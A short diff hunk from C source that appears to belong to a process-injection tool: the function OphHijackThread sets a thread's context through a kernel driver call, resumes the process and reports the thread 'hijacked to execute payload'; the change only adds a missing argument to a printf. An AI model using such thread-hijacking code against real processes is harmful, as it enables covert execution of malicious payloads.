@@ -38,7 +38,7 @@ DWORD OphHijackThread(DWORD pid, LPWSTR url) {
 	KphSetContextThread(hThread, &ctx);
 	OphResumeProcess(pid);
 
-	printf("\n[+] Process %d thread is hijacked to execute payload");
+	printf("\n[+] Process %d thread is hijacked to execute payload", pid);
 
 	return 0;
 
